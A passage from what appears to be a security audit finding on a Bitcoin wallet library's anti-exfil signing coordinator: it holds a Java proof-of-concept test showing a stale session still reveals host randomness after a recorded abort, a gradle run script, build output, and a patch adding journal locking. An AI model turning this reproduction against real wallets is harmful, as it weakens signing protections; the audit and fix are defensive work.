        AntiExfilException blocked = assertThrows(AntiExfilException.class, () -> AntiExfilCoordinator.create(
                freshSession, journal, original, keystore, AntiExfilNetwork.TESTNET4));
        assertEquals(AntiExfilException.Code.RETRY_CONFLICT, blocked.getCode());
        assertFalse(Files.exists(freshSession), "The abort journal now blocks new unacknowledged sessions");

        byte[] openingsB = openingsFor(sessionB.getHostCommitMessage(), signatureTemplate);
        byte[] revealB = sessionB.acceptOpenings(openingsB);
        AntiExfilMessage revealMessageB = AntiExfilCodec.decode(revealB);

        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessageB.getStage(),
                "The stale pre-created capability still discloses a second host reveal after the abort");
        assertEquals(AntiExfilCoordinator.Phase.OPENINGS_ACCEPTED, sessionB.getStatus().getPhase(),
                "The stale pre-created session advanced to the post-reveal phase after the wallet-wide abort");
        assertEquals(1, sessionB.getStatus().getPostRevealAbortCount(),
                "The second reveal happened while the wallet-wide abort journal was non-empty");
        assertNotEquals(Utils.bytesToHex(revealMessageA.getSessionId()), Utils.bytesToHex(revealMessageB.getSessionId()));
        assertNotEquals(Utils.bytesToHex(revealA), Utils.bytesToHex(revealB));
        for(AntiExfilSlot slot : revealMessageB.getSlots()) {
            assertNotNull(slot.getHostRandomness(), "The post-abort HOST_REVEAL contains rho for every slot");
            assertEquals(32, slot.getHostRandomness().length);
            assertArrayEquals(AntiExfilCrypto.hostCommit(slot.getHostRandomness()), slot.getCommitment());
        }
    }

    private static byte[] openingsFor(byte[] encodedCommit, AntiExfilMessage signatureTemplate) {
        AntiExfilMessage commit = AntiExfilCodec.decode(encodedCommit);
        assertEquals(AntiExfilStage.HOST_COMMIT, commit.getStage());
        assertEquals(signatureTemplate.getSlots().size(), commit.getSlots().size());

        List<AntiExfilSlot> slots = new ArrayList<>();
        for(int i = 0; i < commit.getSlots().size(); i++) {
            AntiExfilSlot committed = commit.getSlots().get(i);
            AntiExfilSlot template = signatureTemplate.getSlots().get(i);
            assertEquals(committed.getInputIndex(), template.getInputIndex());
            assertEquals(committed.getSighashType(), template.getSighashType());
            assertArrayEquals(committed.getSignerPublicKey(), template.getSignerPublicKey());
            assertArrayEquals(committed.getMessageHash(), template.getMessageHash());
            slots.add(new AntiExfilSlot(committed.getInputIndex(), committed.getSighashType(), committed.getSignerPublicKey(),
                    committed.getMessageHash(), committed.getCommitment(), template.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(commit.getNetwork(), AntiExfilStage.SIGNER_OPENINGS,
                commit.getSessionId(), commit.getPsbtDigest(), slots));
        AntiExfilCodec.validateTransition(commit, AntiExfilCodec.decode(openings));
        return openings;
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc' --rerun-tasks
```
### Output

```
[output truncated: 8 lines & 0.3916015625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 10s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC executed successfully with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --tests 'com.sparrowwallet.drongo.antiexfil.Poc' --rerun-tasks`. It proves the pre-created-session revocation failure using real `AntiExfilCoordinator.create`, `acceptOpenings`, `recordPostRevealAbort`, journal reads, and codec validation. It does not separately exercise the concurrent stale journal snapshot variant; the deterministic pre-staged path demonstrates the same missing journal check at rho release.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Serialize create, host-randomness release, and abort append under the wallet abort-journal lock; persist whether a session was explicitly acknowledged so stale unacknowledged sessions are revoked while acknowledged sessions remain usable.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilAbortJournal.java
@@ -1,138 +1,155 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.time.Instant;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 
 public final class AntiExfilAbortJournal {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'J'};
     private static final int VERSION = 1;
     private static final int MAX_FILE_BYTES = 4 * 1024 * 1024;
     private static final int MAX_EVENTS = 10_000;
     private static final int MAX_REASON_BYTES = 512;
 
     private final Path path;
     private final byte[] walletIdentity;
 
     public AntiExfilAbortJournal(Path path, byte[] walletIdentity) {
         if(path == null || walletIdentity == null || walletIdentity.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort-journal identity");
         }
         this.path = path;
         this.walletIdentity = walletIdentity.clone();
     }
 
     public List<AbortEvent> getEvents() {
-        return AntiExfilDurableFiles.locked(path, () -> List.copyOf(loadOrCreate().events));
+        return withEvents(List::copyOf);
     }
 
+    <T> T withEvents(EventAction<T> action) {
+        return AntiExfilDurableFiles.locked(path, () -> action.run(List.copyOf(loadOrCreate().events)));
+    }
+
     AbortEvent append(byte[] sessionId, byte[] psbtDigest, String reason) {
+        validateEvent(sessionId, psbtDigest, reason);
+        return AntiExfilDurableFiles.locked(path, () -> appendUnlocked(sessionId, psbtDigest, reason));
+    }
+
+    AbortEvent appendUnlocked(byte[] sessionId, byte[] psbtDigest, String reason) throws IOException {
+        byte[] reasonBytes = validateEvent(sessionId, psbtDigest, reason);
+        Journal journal = loadOrCreate();
+        if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
+        AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
+                new String(reasonBytes, StandardCharsets.UTF_8));
+        List<AbortEvent> updated = new ArrayList<>(journal.events);
+        updated.add(event);
+        AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
+        return event;
+    }
+
+    private static byte[] validateEvent(byte[] sessionId, byte[] psbtDigest, String reason) {
         if(sessionId == null || sessionId.length != 32 || psbtDigest == null || psbtDigest.length != 32) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID, "Invalid abort event context");
         }
         byte[] reasonBytes = reason == null ? new byte[0] : reason.strip().getBytes(StandardCharsets.UTF_8);
         if(reasonBytes.length == 0 || reasonBytes.length > MAX_REASON_BYTES) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Abort reason must contain 1 to " + MAX_REASON_BYTES + " UTF-8 bytes");
         }
-        return AntiExfilDurableFiles.locked(path, () -> {
-            Journal journal = loadOrCreate();
-            if(journal.events.size() >= MAX_EVENTS) throw new IOException("Abort journal is full");
-            AbortEvent event = new AbortEvent(sessionId, psbtDigest, Instant.now().getEpochSecond(),
-                    new String(reasonBytes, StandardCharsets.UTF_8));
-            List<AbortEvent> updated = new ArrayList<>(journal.events);
-            updated.add(event);
-            AntiExfilDurableFiles.write(path, encode(new Journal(walletIdentity, updated)), false);
-            return event;
-        });
+        return reasonBytes;
     }
 
     private Journal loadOrCreate() throws IOException {
         if(!Files.exists(path)) {
             Journal journal = new Journal(walletIdentity, List.of());
             AntiExfilDurableFiles.write(path, encode(journal), true);
             return journal;
         }
         Journal journal = decode(AntiExfilDurableFiles.read(path, MAX_FILE_BYTES));
         if(!Arrays.equals(walletIdentity, journal.walletIdentity)) throw new IOException("Abort journal belongs to another wallet key identity");
         return journal;
     }
 
     private static byte[] encode(Journal journal) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.write(journal.walletIdentity);
             output.writeInt(journal.events.size());
             for(AbortEvent event : journal.events) {
                 byte[] reason = event.reason.getBytes(StandardCharsets.UTF_8);
                 output.write(event.sessionId);
                 output.write(event.psbtDigest);
                 output.writeLong(event.recordedAtEpochSecond);
                 output.writeShort(reason.length);
                 output.write(reason);
             }
         }
         return bytes.toByteArray();
     }
 
     private static Journal decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             byte[] magic = input.readNBytes(4);
             if(!Arrays.equals(magic, MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown abort-journal format");
             byte[] identity = input.readNBytes(32);
             int count = input.readInt();
             if(identity.length != 32 || count < 0 || count > MAX_EVENTS) throw new IOException("Invalid abort-journal header");
             List<AbortEvent> events = new ArrayList<>(count);
             for(int i = 0; i < count; i++) {
                 byte[] sessionId = input.readNBytes(32);
                 byte[] digest = input.readNBytes(32);
                 long timestamp = input.readLong();
                 int reasonLength = input.readUnsignedShort();
                 byte[] reason = input.readNBytes(reasonLength);
                 if(sessionId.length != 32 || digest.length != 32 || reasonLength < 1
                         || reasonLength > MAX_REASON_BYTES || reason.length != reasonLength || timestamp < 0) {
                     throw new IOException("Invalid abort-journal event");
                 }
                 events.add(new AbortEvent(sessionId, digest, timestamp, new String(reason, StandardCharsets.UTF_8)));
             }
             if(input.available() != 0) throw new IOException("Trailing abort-journal data");
             return new Journal(identity, events);
         } catch(EOFException e) {
             throw new IOException("Truncated abort journal", e);
         }
     }
 
+    @FunctionalInterface
+    interface EventAction<T> {
+        T run(List<AbortEvent> events) throws IOException;
+    }
+
     public static final class AbortEvent {
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final long recordedAtEpochSecond;
         private final String reason;
 
         private AbortEvent(byte[] sessionId, byte[] psbtDigest, long recordedAtEpochSecond, String reason) {
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.recordedAtEpochSecond = recordedAtEpochSecond;
             this.reason = reason;
         }
 
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public long getRecordedAtEpochSecond() { return recordedAtEpochSecond; }
         public String getReason() { return reason; }
     }
 
     private record Journal(byte[] walletIdentity, List<AbortEvent> events) {
     }
 }

diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,465 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
-    private static final int VERSION = 1;
+    private static final int VERSION = 2;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
-        State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
-                AntiExfilCodec.encode(commit), null, null, null, null, rhos);
-        List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
-        if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
-            throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
-        }
-        AntiExfilDurableFiles.locked(sessionPath, () -> {
-            AntiExfilDurableFiles.write(sessionPath, encode(state), true);
+        State state = new State(Phase.COMMITMENTS_CREATED, acknowledgePostRevealAbortRisk,
+                coordinator.walletIdentity, originalPsbt, AntiExfilCodec.encode(commit), null, null, null, null, rhos);
+        AntiExfilAbortJournal journal = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity);
+        journal.withEvents(aborts -> {
+            if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
+                throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
+            }
+            AntiExfilDurableFiles.locked(sessionPath, () -> {
+                AntiExfilDurableFiles.write(sessionPath, encode(state), true);
+                return null;
+            });
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
-        return AntiExfilDurableFiles.locked(sessionPath, () -> {
+        AntiExfilAbortJournal journal = new AntiExfilAbortJournal(journalPath, walletIdentity);
+        return journal.withEvents(aborts -> AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
+            if(!aborts.isEmpty() && !state.acknowledgedAbortRisk) {
+                throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before revealing host randomness");
+            }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
-            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
-                    state.message1, encodedOpenings, message3, null, null, state.rhos);
+            State accepted = new State(Phase.OPENINGS_ACCEPTED, state.acknowledgedAbortRisk,
+                    state.walletIdentity, state.originalPsbt, state.message1, encodedOpenings, message3,
+                    null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
-        });
+        }));
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                     AntiExfilCodec.decode(state.message1), signatures, state.rhos);
-            State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
-                    state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
+            State complete = new State(Phase.COMPLETE, state.acknowledgedAbortRisk, state.walletIdentity,
+                    state.originalPsbt, state.message1, state.message2, state.message3,
+                    encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
                 commit, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
-        return AntiExfilDurableFiles.locked(sessionPath, () -> {
+        if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
+        AntiExfilAbortJournal journal = new AntiExfilAbortJournal(journalPath, walletIdentity);
+        return journal.withEvents(ignored -> AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
-            if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
-            return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
-                    commit.getSessionId(), commit.getPsbtDigest(), reason.name());
-        });
+            return journal.appendUnlocked(commit.getSessionId(), commit.getPsbtDigest(), reason.name());
+        }));
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
         byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
+            output.writeBoolean(state.acknowledgedAbortRisk);
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
-            if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
+            byte[] magic = input.readNBytes(4);
+            int version = input.readUnsignedByte();
+            if(!Arrays.equals(magic, MAGIC) || (version != 1 && version != VERSION)) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
+            boolean acknowledgedAbortRisk = version >= 2 && input.readBoolean();
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
-            return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
+            return new State(Phase.values()[phaseCode], acknowledgedAbortRisk, identity, original,
+                    message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
